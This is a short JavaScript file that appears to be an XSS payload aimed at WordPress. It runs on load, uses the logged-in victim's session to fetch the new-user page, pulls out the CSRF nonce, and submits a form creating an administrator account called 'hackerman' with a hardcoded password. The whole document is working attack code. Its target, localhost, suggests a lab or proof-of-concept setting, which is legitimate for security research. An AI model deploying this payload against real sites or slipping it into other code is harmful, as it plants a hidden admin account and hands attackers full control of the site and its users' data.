function addAdmin() {
    fetch("http://localhost:8000/wp-admin/user-new.php", {
        credentials: 'include'
    })
    .then(res => res.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        
        const nonce_container = doc.querySelector('input[id="_wpnonce_create-user"]');
        const _wpnonce_newUser = nonce_container?.getAttribute('value') ;

        
        if (!_wpnonce_newUser) {
            console.warn("Nonce not found.");
            return;
        }
        
        
        let payload = new URLSearchParams({
            action: 'createuser',
            "_wpnonce_create-user": _wpnonce_newUser,
            user_login: 'hackerman',
            email: 'hackerman@hacker.com',
            first_name: '',
            last_name: '',
            url: '',
            pass1: '@rianAMIRI',
            pass2: '@rianAMIRI',
            send_user_notification: '1',
            role: 'administrator',
            createuser: 'Add New User'
        });
        
        
        fetch("http://localhost:8000/wp-admin/user-new.php", {
            method: 'POST',
            credentials: "include",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body: payload.toString(),
        });
    })

}

addAdmin();

 

